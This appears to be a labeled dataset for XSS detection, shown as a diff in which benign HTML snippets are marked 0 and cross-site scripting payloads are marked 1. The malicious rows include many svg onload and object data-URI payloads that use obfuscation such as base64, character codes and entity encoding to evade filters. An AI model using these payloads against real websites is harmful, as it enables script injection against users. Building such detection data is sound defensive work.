+<li href="benign">hello</li>	0
+<li href="benign">sample</li>	0
+<li href="content">benign</li>	0
+<li href="content">content</li>	0
+<li href="content">normal</li>	0
+<li href="content">test</li>	0
+<li href="hello">content</li>	0
+<li href="normal">content</li>	0
+<li href="normal">hello</li>	0
+<li href="normal">normal</li>	0
+<li href="sample">hello</li>	0
+<li href="sample">normal</li>	0
+<li href="sample">world</li>	0
+<li href="test">test</li>	0
+<li href="world">test</li>	0
+<li href="world">world</li>	0
+<li id="benign">sample</li>	0
+<li id="content">hello</li>	0
+<li id="content">world</li>	0
+<li id="hello">content</li>	0
+<li id="normal">benign</li>	0
+<li id="normal">content</li>	0
+<li id="normal">normal</li>	0
+<li id="normal">sample</li>	0
+<li id="sample">content</li>	0
+<li id="sample">hello</li>	0
+<li id="sample">test</li>	0
+<li id="test">benign</li>	0
+<li id="test">hello</li>	0
+<li id="test">normal</li>	0
+<li id="test">world</li>	0
+<li id="world">benign</li>	0
+<li id="world">hello</li>	0
+<li id="world">sample</li>	0
+<li id="world">test</li>	0
+<li src="benign">content</li>	0
+<li src="content">hello</li>	0
+<li src="hello">benign</li>	0
+<li src="hello">hello</li>	0
+<li src="hello">normal</li>	0
+<li src="hello">sample</li>	0
+<li src="hello">test</li>	0
+<li src="normal">benign</li>	0
+<li src="normal">hello</li>	0
+<li src="normal">sample</li>	0
+<li src="normal">test</li>	0
+<li src="sample">benign</li>	0
+<li src="sample">content</li>	0
+<li src="sample">hello</li>	0
+<li src="sample">sample</li>	0
+<li src="sample">test</li>	0
+<li src="test">benign</li>	0
+<li src="test">world</li>	0
+<li src="world">content</li>	0
+<li style="content">hello</li>	0
+<li style="content">normal</li>	0
+<li style="content">sample</li>	0
+<li style="hello">benign</li>	0
+<li style="hello">hello</li>	0
+<li style="hello">normal</li>	0
+<li style="hello">sample</li>	0
+<li style="hello">test</li>	0
+<li style="hello">world</li>	0
+<li style="normal">normal</li>	0
+<li style="normal">test</li>	0
+<li style="sample">benign</li>	0
+<li style="sample">content</li>	0
+<li style="sample">hello</li>	0
+<li style="test">content</li>	0
+<li style="test">hello</li>	0
+<li style="test">sample</li>	0
+<li style="world">hello</li>	0
+<li style="world">test</li>	0
+<li title="benign">test</li>	0
+<li title="content">hello</li>	0
+<li title="hello">benign</li>	0
+<li title="hello">sample</li>	0
+<li title="normal">test</li>	0
+<li title="normal">world</li>	0
+<li title="sample">benign</li>	0
+<li title="sample">hello</li>	0
+<li title="test">hello</li>	0
+<li title="test">normal</li>	0
+<li title="world">normal</li>	0
+<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>window['al'+'ert'](3)</script></svg>"></object>	1
+<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>window['al'+'ert'](7)</script></svg>"></object>	1
+<object data="data:text/html,<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>"></object>	1
+<object data="data:text/html,<img src=x onerror=alert(1)>"></object>	1
+<object data="data:text/html,<img src=x onerror=eval('al'+'ert(1)')>"></object>	1
+<object data="data:text/html,<img src=x onerror=eval('ale'+'rt(1)')>"></object>	1
+<object data="data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></object>	1
+<object data="data:text/html,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></object>	1
+<object data="data:text/html,<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></object>	1
+<object data="data:text/html,<img src=x onerror=setTimeout('alert(1)',0)>"></object>	1
+<object data="data:text/html,<img src=x onerror=setTimeout(Function('al'+'ert(1)'),0)>"></object>	1
+<object data="data:text/html,<img src=x onerror=window['al'+'ert'](1)>"></object>	1
+<object data="data:text/html,<script>window['al'+'ert'](5)</script>"></object>	1
+<object data="data:text/html,<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"></object>	1
+<object data="data:text/html,<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>"></object>	1
+<object data="data:text/html,<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>"></object>	1
+<object data="data:text/html,<svg onload=al&#x65;rt(1)>"></object>	1
+<object data="data:text/html,<svg onload=eval('al'+'ert(1)')></svg>"></object>	1
+<object data="data:text/html,<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></svg>"></object>	1
+<object data="data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>"></object>	1
+<object data="data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></object>	1
+<object data="data:text/html,<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"></object>	1
+<object data="data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))>"></object>	1
+<object data="data:text/html,<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></object>	1
+<object data="data:text/html,<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></object>	1
+<object data="data:text/html,<svg onload=setTimeout('al&#x65;rt(1)',0)>"></object>	1
+<object data="data:text/html,<svg onload=setTimeout('al'+'ert(1)',0)>"></object>	1
+<object data="data:text/html,<svg onload=setTimeout('al'+'ert(1)',0)></svg>"></object>	1
+<object data="data:text/html,<svg onload=setTimeout('alert(1)',0)>"></object>	1
+<object data="data:text/html,<svg onload=window%5b%22al%22+%22ert%22%5d(1)></svg>"></object>	1
+<object data="data:text/html,<svg onload=window['\x61\x6c\x65\x72\x74'](1) />"></object>	1
+<object data="data:text/html,<svg onload=window['al'+'ert'](1)>"></object>	1
+<object data="data:text/html,<svg onload=window['al'+'ert'](1)></svg>"></object>	1
+<object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4="></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4="></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9J3dpbmRvdy5hbGVydCgxKSc+"></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9c2V0VGltZW91dCgnYWxlcnQoMSknKT4="></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9c2V0VGltZW91dCgnYWxlcnQoMSknKTs+"></object>	1
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WydhbGVydCddKDEpPjwvc3ZnPg=="></object>	1
+<object data="data:text/html;charset=utf-8,%3Csvg%20onload%3D%22window%5B%27al%27%2B%27ert%27%5D(1)%22%3E"></object>	1
+<object data='data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>	1
+<object data='data:text/html,<img src=x onerror=window["al"+"ert"](1)>'></object>	1
+<object data='data:text/html,<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>'></object>	1
+<object data='data:text/html,<svg onload=alert(1)>'></object>	1
+<object data='data:text/html,<svg onload=alert(String.fromCharCode(49))>'></object>	1
+<object data='data:text/html,<svg onload=eval("al"+"ert(1)")>'></object>	1
+<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>	1
+<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>'></object>	1
+<object data='data:text/html,<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></svg>'></object>	1
+<object data='data:text/html,<svg onload=eval(atob("YWxlcnQoMSk="))>'></object>	1
+<object data='data:text/html,<svg onload=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></object>	1
+<object data='data:text/html,<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>'></object>	1
+<object data='data:text/html,<svg onload=setTimeout(function(){eval(`al`+`ert(1)`);},0)>'></object>	1
+<object data='data:text/html,<svg onload=window["al"+"ert"](1)>'></object>	1
+<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>	1
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>	1
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WyJhbGVydCJdKDEpPg=='></object>	1
+<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>	1
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4=></object>	1
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></object>	1
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9ZXZhbCgnYWxlcnQoMSknKT48L3N2Zz4+></object>	1
+<object type="text/x-scriptlet" data='data:text/html;charset=utf-7,<script>alert(1)</script>'></object>	1
+<p alt="benign">normal</p>	0
+<p alt="content">content</p>	0
+<p alt="content">hello</p>	0
+<p alt="hello">benign</p>	0
+<p alt="hello">content</p>	0
+<p alt="hello">sample</p>	0
+<p alt="normal">hello</p>	0
+<p alt="normal">normal</p>	0
+<p alt="sample">benign</p>	0
+<p alt="sample">sample</p>	0
+<p alt="sample">world</p>	0
+<p alt="test">hello</p>	0
+<p alt="test">normal</p>	0
+<p alt="test">test</p>	0
+<p alt="test">world</p>	0
+<p alt="world">content</p>	0
+<p alt="world">hello</p>	0
+<p alt="world">normal</p>	0
+<p alt="world">sample</p>	0
+<p class="benign">content</p>	0
+<p class="benign">hello</p>	0
+<p class="benign">sample</p>	0
+<p class="benign">test</p>	0
+<p class="content">content</p>	0
+<p class="content">world</p>	0
+<p class="hello">hello</p>	0
+<p class="normal">benign</p>	0
+<p class="normal">normal</p>	0
+<p class="normal">sample</p>	0
+<p class="normal">test</p>	0
+<p class="sample">benign</p>	0
+<p class="sample">sample</p>	0
+<p class="sample">world</p>	0
+<p class="test">benign</p>	0
+<p class="test">normal</p>	0
+<p class="test">world</p>	0
+<p href="benign">benign</p>	0
+<p href="benign">content</p>	0
+<p href="benign">hello</p>	0
+<p href="benign">world</p>	0
+<p href="content">benign</p>	0
+<p href="content">normal</p>	0
+<p href="content">test</p>	0
+<p href="content">world</p>	0
+<p href="hello">benign</p>	0
+<p href="hello">content</p>	0
+<p href="hello">hello</p>	0
+<p href="hello">test</p>	0
+<p href="normal">normal</p>	0
+<p href="normal">world</p>	0
+<p href="sample">content</p>	0
+<p href="sample">sample</p>	0
+<p href="sample">test</p>	0
+<p href="sample">world</p>	0
+<p href="test">normal</p>	0
+<p href="world">benign</p>	0
+<p href="world">content</p>	0
+<p href="world">sample</p>	0
+<p id="content">benign</p>	0
+<p id="content">content</p>	0
+<p id="content">test</p>	0
+<p id="hello">hello</p>	0
+<p id="normal">hello</p>	0
+<p id="normal">world</p>	0
+<p id="sample">benign</p>	0
+<p id="sample">hello</p>	0
+<p id="world">sample</p>	0
+<p id="world">world</p>	0
+<p src="benign">world</p>	0
+<p src="content">benign</p>	0
+<p src="content">content</p>	0
+<p src="content">sample</p>	0
+<p src="hello">benign</p>	0
+<p src="hello">test</p>	0
+<p src="normal">hello</p>	0
+<p src="sample">benign</p>	0
+<p src="sample">hello</p>	0
+<p src="test">benign</p>	0
+<p src="test">normal</p>	0
+<p src="test">sample</p>	0
+<p src="test">test</p>	0
+<p src="test">world</p>	0
+<p src="world">sample</p>	0
+<p src="world">test</p>	0
+<p style="benign">hello</p>	0
+<p style="benign">sample</p>	0
+<p style="benign">world</p>	0
+<p style="content">normal</p>	0
+<p style="content">test</p>	0
+<p style="hello">benign</p>	0
+<p style="hello">content</p>	0
+<p style="hello">hello</p>	0
+<p style="hello">sample</p>	0
+<p style="hello">test</p>	0
+<p style="hello">world</p>	0
+<p style="normal">content</p>	0
+<p style="sample">benign</p>	0
+<p style="sample">hello</p>	0
+<p style="sample">normal</p>	0
+<p style="sample">sample</p>	0
+<p style="sample">test</p>	0
+<p style="sample">world</p>	0
+<p style="test">content</p>	0
+<p style="test">hello</p>	0
+<p style="test">normal</p>	0
+<p style="test">world</p>	0
+<p style="world">content</p>	0
+<p style="world">normal</p>	0
+<p style="world">sample</p>	0
+<p title="benign">hello</p>	0
+<p title="benign">sample</p>	0
+<p title="content">benign</p>	0
+<p title="content">content</p>	0
+<p title="content">hello</p>	0
+<p title="hello">benign</p>	0
+<p title="hello">hello</p>	0
+<p title="hello">world</p>	0
+<p title="normal">benign</p>	0
+<p title="normal">hello</p>	0
+<p title="normal">normal</p>	0
+<p title="normal">test</p>	0
+<p title="sample">benign</p>	0
+<p title="sample">normal</p>	0
+<p title="sample">sample</p>	0
+<p title="test">benign</p>	0
+<p title="test">test</p>	0
+<p title="world">benign</p>	0
+<p title="world">world</p>	0
+<span alt="benign">benign</span>	0
+<span alt="benign">normal</span>	0
+<span alt="benign">test</span>	0
+<span alt="content">benign</span>	0
+<span alt="content">content</span>	0
+<span alt="content">test</span>	0
+<span alt="normal">benign</span>	0
+<span alt="normal">sample</span>	0
+<span alt="normal">test</span>	0
+<span alt="sample">benign</span>	0
+<span alt="sample">hello</span>	0
+<span alt="sample">sample</span>	0
+<span alt="sample">test</span>	0
+<span alt="test">benign</span>	0
+<span alt="test">content</span>	0
+<span alt="test">normal</span>	0
+<span alt="test">test</span>	0
+<span alt="world">hello</span>	0
+<span alt="world">normal</span>	0
+<span alt="world">sample</span>	0
+<span alt="world">test</span>	0
+<span class="benign">content</span>	0
+<span class="benign">world</span>	0
+<span class="content">benign</span>	0
+<span class="content">hello</span>	0
+<span class="content">sample</span>	0
+<span class="content">test</span>	0
+<span class="hello">normal</span>	0
+<span class="hello">test</span>	0
+<span class="hello">world</span>	0
+<span class="normal">content</span>	0
+<span class="normal">hello</span>	0
+<span class="normal">normal</span>	0
+<span class="normal">world</span>	0
+<span class="sample">benign</span>	0
+<span class="sample">content</span>	0
+<span class="sample">sample</span>	0
+<span class="test">sample</span>	0
+<span class="world">content</span>	0
+<span class="world">normal</span>	0
+<span class="world">sample</span>	0
+<span href="benign">content</span>	0
+<span href="benign">hello</span>	0
+<span href="benign">world</span>	0
+<span href="content">hello</span>	0
+<span href="content">world</span>	0
+<span href="hello">content</span>	0
+<span href="hello">sample</span>	0
+<span href="normal">benign</span>	0
+<span href="normal">content</span>	0
+<span href="normal">hello</span>	0
+<span href="normal">normal</span>	0
+<span href="sample">benign</span>	0
+<span href="test">content</span>	0
+<span href="test">normal</span>	0
+<span href="test">sample</span>	0
+<span href="world">benign</span>	0
+<span href="world">normal</span>	0
+<span href="world">sample</span>	0
+<span id="benign">normal</span>	0
+<span id="benign">test</span>	0
+<span id="benign">world</span>	0
+<span id="content">benign</span>	0
+<span id="content">world</span>	0
+<span id="hello">normal</span>	0
+<span id="hello">test</span>	0
+<span id="normal">hello</span>	0
+<span id="normal">normal</span>	0
+<span id="normal">test</span>	0
+<span id="normal">world</span>	0
+<span id="sample">benign</span>	0
+<span id="sample">hello</span>	0
+<span id="sample">world</span>	0
+<span id="test">benign</span>	0
+<span id="test">content</span>	0
+<span id="test">sample</span>	0
+<span id="world">content</span>	0
+<span id="world">sample</span>	0
+<span id="world">world</span>	0
+<span src="benign">benign</span>	0
+<span src="benign">content</span>	0
+<span src="benign">hello</span>	0
+<span src="benign">world</span>	0
+<span src="content">test</span>	0
+<span src="normal">test</span>	0
+<span src="normal">world</span>	0
+<span src="sample">hello</span>	0
+<span src="sample">normal</span>	0
+<span src="sample">test</span>	0
+<span src="test">hello</span>	0
+<span src="test">normal</span>	0
+<span src="world">hello</span>	0
+<span src="world">normal</span>	0
+<span src="world">sample</span>	0
+<span src="world">test</span>	0
+<span style="benign">normal</span>	0
+<span style="benign">world</span>	0
+<span style="content">hello</span>	0
+<span style="content">normal</span>	0
+<span style="content">sample</span>	0
+<span style="content">world</span>	0
+<span style="hello">hello</span>	0
+<span style="hello">normal</span>	0
+<span style="hello">sample</span>	0
+<span style="normal">benign</span>	0
+<span style="normal">content</span>	0
+<span style="normal">hello</span>	0
+<span style="sample">benign</span>	0
+<span style="sample">hello</span>	0
+<span style="sample">normal</span>	0
+<span style="test">content</span>	0
+<span style="test">sample</span>	0
+<span style="test">test</span>	0
+<span style="test">world</span>	0
+<span style="world">content</span>	0
+<span title="benign">content</span>	0
+<span title="benign">hello</span>	0
+<span title="benign">normal</span>	0
+<span title="benign">world</span>	0
+<span title="content">test</span>	0
+<span title="content">world</span>	0
+<span title="hello">normal</span>	0
+<span title="hello">test</span>	0
+<span title="hello">world</span>	0
+<span title="normal">benign</span>	0
+<span title="normal">normal</span>	0
+<span title="normal">test</span>	0
+<span title="sample">hello</span>	0
+<span title="sample">normal</span>	0
+<span title="test">sample</span>	0
+<span title="test">test</span>	0
+<span title="test">world</span>	0
+<span title="world">benign</span>	0
+<span title="world">content</span>	0
+<span title="world">sample</span>	0
+<span title="world">test</span>	0
+<span title="world">world</span>	0
+<svg onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">	1
+<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">	1
+<svg onload="&#x2f;&#x2a;some&#x2a;&#x2f;&#x61lert('XSS')">	1
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">	1
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#49;&#x29;">	1
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">	1
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">	1
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(&#x27;XSS&#x27;)">	1
+<svg onload="&#x65;&#118;&#97;&#x6c;(unescape('%61%6c%65%72%74(%27%58%53%53%27)'))">	1
+<svg onload="&#x65;&#x76;&#x61;&#x6c;(`al\x65rt(1)`)"></svg>	1
+<svg onload="&#x65v&#x61l(atob('YWxlcnQod2luZG93LmFsZXJ0KDEpKQ=='))">	1
+<svg onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">	1
+<svg onload="(() => {eval('ale' + 'rt(1)')})()">	1
+<svg onload="(()=>{const a='al'+'ert';window[a]('XSS')})()">	1
+<svg onload="(new Function('al'+'ert(1)'))()">	1
+<svg onload="(new Function('ale'+'rt(1)'))()"></svg>	1
+<svg onload="Function('ale'+'rt(1)')()"></svg>	1
+<svg onload="\u0065\u0076\u0061\u006C('\x61\x6C\x65\x72\x74(7)')">	1
+<svg onload="a=String.fromCharCode,f=(x)=>eval(x);f(a(97,108,101,114,116,40,39,88,83,83,39,41))"></svg>	1
+<svg onload="at='',[...'hello'].map((x,y)=>at+=String.fromCharCode(x.charCodeAt()*2-y)),alert(at)"></svg>	1
+<svg onload="document.location=`javascript:alert\`XSS\``">	1
+<svg onload="document.write('<scr'+'ipt>alert(1)</scr'+'ipt>')">	1
+<svg onload="eval(&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;)">	1
+<svg onload="eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')">	1
+<svg onload="eval('al'+'ert(1)')"></svg>	1
+<svg onload="eval('alert(1)')">	1
+<svg onload="eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))">	1
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41))">	1
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">	1
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">	1
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>	1
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,51,41))">	1
+<svg onload="eval(String['f'+'r'+'o'+'m'+'C'+'h'+'a'+'r'+'C'+'o'+'d'+'e'](97,108,101,114,116,40,39,88,83,83,39,41))">	1
+<svg onload="eval(String['fr'+'omC'+'harC'+'ode'](97,108,101,114,116,40,39,88,83,83,39,41))">	1
+<svg onload="eval(String['fr'+'omCh'+'arCo'+'de'](97,108,101,114,116,40,39,88,83,83,39,41))">	1
+<svg onload="eval(atob(&#39;YWxlcnQoMSk=&#39;))">	1
+<svg onload="eval(atob('YWxlcnQoJ1hTUyc=')+String.fromCharCode(41))">	1
+<svg onload="eval(atob('YWxlcnQoJ1hTUycp'))">	1
+<svg onload="eval(atob('YWxlcnQoJzEnKQ=='))">	1
+<svg onload="eval(atob('YWxlcnQoMSk='))">	1
+<svg onload="eval(atob('YWxlcnQoMSk='))"></svg>	1
+<svg onload="eval(atob('YWxlcnQoMTExKQ=='))">	1
+<svg onload="eval(atob('YWxlcnQoMTIzKQ=='))">	1
+<svg onload="eval(atob('YWxlcnQoMzIp'))">	1
+<svg onload="eval(atob('YWxlcnQoNzAp'))">	1
+<svg onload="eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))">	1
+<svg onload="eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))"></svg>	1
+<svg onload="eval(unescape('%61%6C%65%72%74%28%22XSS%22%29'))">	1
+<svg onload="eval(unescape('%61%6C%65%72%74%28%31%29'))">	1
+<svg onload="eval(unescape('%61%6C%65%72%74%28%34%29'))">	1
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%29'))">	1
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%29'))"></svg>	1
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))">	1
+<svg onload="fetch('data:text/javascr'+'ipt;base64,YWxlcnQoMSk=', {mode:'no-cors'}).then(r=>r.text().then(eval))">	1
+<svg onload="fetch('data:text/plain;base64,YWxlcnQoMSk=').then(r=>r.text()).then(eval)"></svg>	1
+<svg onload="let x = this.constructor; x.constructor('alert\u00281\u0029')()">	1
+<svg onload="location='javas'+'cript:al'+'ert(1)'">	1
+<svg onload="new Function(&#39;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;)()">	1
+<svg onload="new Function(&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;)()">	1
+<svg onload="new Function('&#97;&#108;&#101;&#114;&#116;(1)')()">	1
+<svg onload="new Function('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')()">	1
+<svg onload="new Function('\u0061\x6C\x65\x72\x74(10)')()">	1
+<svg onload="new Function('a','alert(a)')(1)">	1
+<svg onload="new Function('al'+'ert(1)')()">	1
+<svg onload="new Function('ale'+'rt(1)')()"></svg>	1
+<svg onload="new Function('alert(1)')()">	1
+<svg onload="new Function('eval(unescape(&quot;%61%6c%65%72%74%28%27%58%53%53%27%29&quot;))')()">	1
+<svg onload="new Function('w',`w=window['\\u0061l\\u0065rt'](35)`)(window)"></svg>	1
+<svg onload="new Function(`\\u0061lert(1)`)()">	1
+<svg onload="new Function(atob('YWxlcnQoJzEnKQ=='))()">	1
+<svg onload="new Function(atob('YWxlcnQoMSk='))()">	1
+<svg onload="new Function(unescape('%61%6c%65%72%74(1)'))()">	1
+<svg onload="set&#84;imeout(&#39;&#97;lert&#40;/XSS/\&#41;&#39;)">	1
+<svg onload="setInterval('al'+String.fromCharCode(101,114,116)+'(1)',1000)">	1
+<svg onload="setInterval(function(){ale&#114;t('XSS')},1000)">	1
+<svg onload="setTimeout(&quot;&#97;&#108;&#101;&#114;&#116&#40;1&#41;&quot;,0)">	1
+<svg onload="setTimeout('al'+'ert(1)')">	1
+<svg onload="setTimeout('al'+'ert(1)',0)">	1
+<svg onload="setTimeout('al'+'ert(123)',0)">	1
+<svg onload="setTimeout('ale'+'rt(1)',0)">	1
+<svg onload="setTimeout('ale'+'rt(1)',0)"></svg>	1
+<svg onload="setTimeout('ale'+'rt(1)',1)"></svg>	1
+<svg onload="setTimeout('alert(1)', 0)">	1
+<svg onload="setTimeout('alert(String.fromCharCode(88,83,83))',0)">	1
+<svg onload="setTimeout('eval(atob(\'YWxlcnQoMSk=\'))', 0)"></svg>	1
+<svg onload="setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)">	1
+<svg onload="setTimeout('window[&quot;al&quot;+&quot;ert&quot;](1)',0)">	1
+<svg onload="setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)">	1
+<svg onload="setTimeout(() => window['al'+'ert'](1), 0)">	1
+<svg onload="setTimeout(() => window[atob('YWxlcnQ=')](1),0)">	1
+<svg onload="setTimeout(() => {alert('XSS')}, 1)">	1
+<svg onload="setTimeout(()=>window['al'+'ert'](1),0)">	1
+<svg onload="setTimeout(()=>{alert(String.fromCharCode(49,49,49))},0)"></svg>	1
+<svg onload="setTimeout(()=>{const e=Function;new e('ale'+'rt(1)')()},0)">	1
+<svg onload="setTimeout(()=>{eval(atob('YWxlcnQoMSk='))},0)"></svg>	1
+<svg onload="setTimeout(()=>{let e=unescape('%61%6c%65%72%74%28%31%29');eval(e)},0)">	1
+<svg onload="setTimeout(()=>{window['al'+'ert'](1)},0)">	1
+<svg onload="setTimeout(()=>{window[`al`+`ert`](49)},0)"></svg>	1
+<svg onload="setTimeout(Function('al'+'ert(1)'),0)">	1
+<svg onload="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)">	1
+<svg onload="setTimeout(`&#x61;lert(1)`,0)">	1
+<svg onload="setTimeout(`al${'ert'}(1)`,0)">	1
+<svg onload="setTimeout(atob('YWxlcnQoMSk='),0)">	1
+<svg onload="setTimeout(decodeURIComponent('%61%6c%65%72%74(1)'),0)">	1
+<svg onload="setTimeout(function(){&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;},0)">	1
+<svg onload="setTimeout(function(){al&#101;rt(123)},0)">	1
+<svg onload="setTimeout(function(){aler&#116;(&#34;X&#83;&#83;&#34;)})">	1
+<svg onload="setTimeout(function(){eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)},0)">	1
+<svg onload="setTimeout(function(){let a=atob('YWxlcnQoMSk=');eval(a)},0)">	1
+<svg onload="setTimeout(function(){window['al'+'ert']('XSS')},0)">	1
+<svg onload="setTimeout(function(){window['al'+'ert'](1)},0)">	1
+<svg onload="setTimeout(unescape('%61%6c%65%72%74(1)'),0)">	1
+<svg onload="this.constructor.constructor('al'+'ert(1)')()">	1
+<svg onload="this.removeAttribute('onload');eval(atob('YWxlcnQoMSk='))"></svg>	1
+<svg onload="this.src=&#34;d&#34;;eval(atob(&#39;YWxlcnQoMCk=&#39;))">	1
+<svg onload="this['\x6f\x6e\x6c\x6f\x61\x64']=(function(){let a=unescape('%61%6c%65%72%74%28%31%29');eval(a)}())">	1
+<svg onload="this['\x6f\x6eload']=null;window['\x61l\x65rt'](1)">	1
+<svg onload="this['r'+'emove']();&#x61;&#x6c;&#x65;&#x72;&#x74;(`18`)">	1
+<svg onload="top['\x65v\x61l'](String.fromCharCode(97,108,101,114,116,40,49,41))">	1
+<svg onload="top['alert'](1)">	1
+<svg onload="window&#91;&#39;&#97;&#x6c;&#x65;&#x72;&#x74;&#39;&#93;&#x28;&#x31;&#x29;">	1
+<svg onload="window.setTimeout('alert(String.fromCharCode(88,83,83))',0)">	1
+<svg onload="window[&quot;al&quot;+&quot;ert&quot;](1)">	1
+<svg onload="window['\u0061\u006c\u0065\u0072\u0074'](1)"></svg>	1
+<svg onload="window['\u0061l\x65rt'](1)">	1
+<svg onload="window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')">	1
+<svg onload="window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](1)">	1
+<svg onload="window['\x61l\x65rt'](1)">	1
+<svg onload="window['\x65val']('\x61\x6c\x65\x72\x74\x28\x31\x29')">	1
+<svg onload="window['al'+'\u0065rt'](1)">	1
+<svg onload="window['al'+'ert']('XSS')">	1
+<svg onload="window['al'+'ert'](1)">	1
+<svg onload="window['al'+'ert'](String.raw`1`)">	1
+<svg onload="window['al'+String.fromCharCode(101)+'rt'](13)"></svg>	1
+<svg onload="window['al\x65rt'](1)">	1
+<svg onload="window['ale'+'rt'](1)"></svg>	1
+<svg onload="window['ale'+'rt'](123)">	1
+<svg onload="window[String.fromCharCode(97,108,101,114,116)](1)">	1
+<svg onload="window[`\u0061lert`](1)">	1
+<svg onload="window[atob('YWxlcnQ=')](1)">	1
+<svg onload="window[atob('YWxlcnQ=')](123)">	1
+<svg onload="window[decodeURIComponent('%61%6c%65%72%74')](1)">	1
+<svg onload="window[unescape('%61%6c%65%72%74')](1)">	1
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#66;&#39;&#41;>	1
+<svg onload=&#97;&#x6c;&#x65;&#x72;&#x74;(1)></svg>	1
+<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;'>	1
+<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#104;&#105;&#33;&#96;&#41;'>	1
+<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#88;&#83;&#83;&#96;&#41;'></svg>	1
